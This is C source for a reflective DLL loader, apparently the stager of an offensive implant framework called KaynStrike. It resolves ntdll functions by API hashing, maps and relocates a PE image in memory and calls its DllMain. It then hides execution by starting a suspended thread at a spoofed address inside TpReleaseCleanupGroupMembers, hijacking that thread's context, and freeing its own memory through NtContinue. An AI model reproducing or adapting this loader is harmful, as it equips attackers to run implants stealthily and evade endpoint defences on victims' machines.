
#include <KaynStrike.h>
#include <KWin32.h>

PVOID WINAPI KaynLoader( VOID )
{
    INSTANCE                Instance        = { 0 };
    PVOID                   KMemBase        = NULL;
    HMODULE                 KaynLibraryLdr  = NULL;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    LPVOID                  KVirtualMemory  = NULL;
    SIZE_T                  KMemSize        = 0;
    PVOID                   SecMemory       = NULL;
    PVOID                   SecMemorySize   = 0;
    DWORD                   Protection      = 0;
    ULONG                   OldProtection   = 0;
    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;

    CONTEXT                 CtxFreeMem      = { 0 };
    CONTEXT                 CtxEntry        = { 0 };
    HANDLE                  hThread         = NULL;

    // 0. First we need to get our own image base
    KMemBase       = KRip() - 0x16;
    KaynLibraryLdr = KaynCaller();

    // ------------------------
    // 1. Load needed Functions
    // ------------------------
    Instance.Modules.Ntdll                 = KGetModuleByHash( NTDLL_HASH );

    Instance.Win32.RtlCaptureContext       = KGetProcAddressByHash( Instance.Modules.Ntdll, SYS_RTLCAPTURECONTEXT );
    Instance.Win32.RtlExitUserThread       = KGetProcAddressByHash( Instance.Modules.Ntdll, SYS_RTLEXITUSERTHREAD );

    Instance.Win32.LdrLoadDll              = KGetProcAddressByHash( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
    Instance.Win32.LdrGetProcedureAddress  = KGetProcAddressByHash( Instance.Modules.Ntdll, SYS_LDRGETPROCEDUREADDRESS );

    Instance.Win32.NtAllocateVirtualMemory = KGetProcAddressByHash( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
    Instance.Win32.NtProtectVirtualMemory  = KGetProcAddressByHash( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
    Instance.Win32.NtFreeVirtualMemory     = KGetProcAddressByHash( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );
    Instance.Win32.NtContinue              = KGetProcAddressByHash( Instance.Modules.Ntdll, SYS_NTCONTINUE );
    Instance.Win32.NtCreateThreadEx        = KGetProcAddressByHash( Instance.Modules.Ntdll, 0xaf18cfb0 );
    Instance.Win32.NtResumeThread          = KGetProcAddressByHash( Instance.Modules.Ntdll, 0x5a4bc3d0 );
    Instance.Win32.NtGetContextThread      = KGetProcAddressByHash( Instance.Modules.Ntdll, 0x6d22f884 );
    Instance.Win32.NtSetContextThread      = KGetProcAddressByHash( Instance.Modules.Ntdll, 0xffa0bf10 );

    // Spoof function
    Instance.Win32.TpReleaseCleanupGroupMembers = KGetProcAddressByHash( Instance.Modules.Ntdll, 0x6eba7a2a );

    // ---------------------------------------------------------------------------
    // 2. Allocate virtual memory and copy headers and section into the new memory
    // ---------------------------------------------------------------------------
    NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage;

    if ( NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
    {
        // ---- Copy Sections into new allocated memory ----
        SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            MemCopy(
                    C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress ),    // Section New Memory
                    C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),  // Section Raw Data
                    SecHeader[ i ].SizeOfRawData                                // Section Size
            );
        }

        // ----------------------------------
        // 3. Process our images import table
        // ----------------------------------
        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
        if ( ImageDir->VirtualAddress )
            KResolveIAT( &Instance, KVirtualMemory, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ) );

        // ----------------------------
        // 4. Process image relocations
        // ----------------------------
        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        if ( ImageDir->VirtualAddress )
            KReAllocSections( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ) );

        // ----------------------------------
        // 5. Set protection for each section
        // ----------------------------------
        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress );
            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
            Protection      = 0;
            OldProtection   = 0;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_READWRITE;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READ;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READWRITE;

            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
        }

        // ----------------------------------------------
        // 6. Finally executing our DllMain + Free itself
        // ----------------------------------------------

        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint );
        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, NULL );

        if ( NT_SUCCESS( Instance.Win32.NtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Win32.TpReleaseCleanupGroupMembers + 0x450, NULL, TRUE, 0, 0, 0, NULL ) ) )
        {
            CtxEntry.ContextFlags = CONTEXT_FULL;
            Instance.Win32.NtGetContextThread( hThread, &CtxEntry );

            CtxEntry.Rip  = U_PTR( KaynDllMain );
            CtxEntry.Rcx  = U_PTR( KVirtualMemory );
            CtxEntry.Rdx  = U_PTR( 4 );
            CtxEntry.R8   = U_PTR( NULL );
            // DllMain( KVirtualMemory, 4, NULL )

            CtxEntry.ContextFlags = CONTEXT_FULL;
            Instance.Win32.NtSetContextThread( hThread, &CtxEntry );
            Instance.Win32.NtResumeThread( hThread, 0 );
        }

        CtxFreeMem.ContextFlags = CONTEXT_FULL;
        KMemSize                = 0;

        Instance.Win32.RtlCaptureContext( &CtxFreeMem );

        CtxFreeMem.Rip  = U_PTR( Instance.Win32.NtFreeVirtualMemory );
        CtxFreeMem.Rcx  = U_PTR( NtCurrentProcess() );
        CtxFreeMem.Rdx  = U_PTR( &KMemBase );
        CtxFreeMem.R8   = U_PTR( &KMemSize );
        CtxFreeMem.R9   = U_PTR( MEM_RELEASE );
        *( ULONG_PTR* )( CtxFreeMem.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.RtlExitUserThread );

        CtxFreeMem.ContextFlags = CONTEXT_FULL;
        Instance.Win32.NtContinue( &CtxFreeMem, FALSE );
    }
}